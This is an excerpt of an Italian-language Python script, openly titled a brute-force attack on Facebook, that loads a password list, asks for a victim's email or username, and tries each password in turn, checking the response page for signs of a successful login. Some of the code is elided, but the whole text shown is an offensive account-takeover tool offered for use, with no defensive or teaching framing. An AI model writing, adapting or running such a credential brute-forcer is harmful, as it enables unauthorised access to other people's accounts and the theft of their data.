...
if sys.version_info[0] != 3:
  print('''\t--------------------------------------\n\t\tRICHIESTO PYTHON 3.x\n\t\tinstalla e prova: python3 fb.py\n\t--------------------------------------''')
  sys.exit()
...
def is_this_a_password(email, index, password):
  ...
  if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
    ...
    print('\password hackerata con successo: ', password)
    return True
  return False

if __name__ == "__main__":
  print('\n---------- ☠️Attacco Brutale Facebook☠️ ----------\n')
  if not os.path.isfile(PASSWORD_FILE):
    print("Il file delle password non esiste: ", PASSWORD_FILE)
    sys.exit(0)
  password_data = open(PASSWORD_FILE, 'r').read().split("\n")
  print("File password selezionato: ", PASSWORD_FILE)
  email = input("Inserisci Email/Username della vittima: ").strip()
  for index, password in zip(range(password_data.__len__()), password_data):
    password = password.strip()
    if len(password) < MIN_PASSWORD_LENGTH:
      continue
    print("Provando password [", index, "]: ", password)
